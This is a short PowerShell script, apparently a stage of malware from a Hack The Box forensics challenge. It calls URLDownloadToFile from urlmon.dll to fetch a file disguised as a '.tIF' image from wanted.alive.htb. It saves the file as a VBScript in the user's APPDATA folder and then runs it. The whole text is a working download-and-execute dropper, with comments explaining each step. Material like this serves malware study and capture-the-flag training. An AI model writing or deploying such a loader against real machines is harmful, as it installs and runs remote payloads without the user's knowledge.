# Define a .NET type to call the URLDownloadToFile function from urlmon.dll
Add-Type -MemberDefinition @"
    [DllImport("urlmon.dll", CharSet = CharSet.Unicode)]
    public static extern IntPtr URLDownloadToFile(
        IntPtr pCaller, 
        string szURL, 
        string szFileName, 
        uint dwReserved, 
        IntPtr lpfnCB
    );
"@ -Name "UrlDownloader" -Namespace "DownloaderNamespace" -PassThru

# Use the defined function to download the file
[DownloaderNamespace.UrlDownloader]::URLDownloadToFile(
    0, 
    "http://wanted.alive.htb/35/wanted.tIF", 
    "$env:APPDATA\wanted.vbs", 
    0, 
    0
)

# Wait for 3 seconds to ensure the file is downloaded
Start-Sleep -Seconds 3

# Execute the downloaded VBScript file
Start-Process "$env:APPDATA\wanted.vbs"
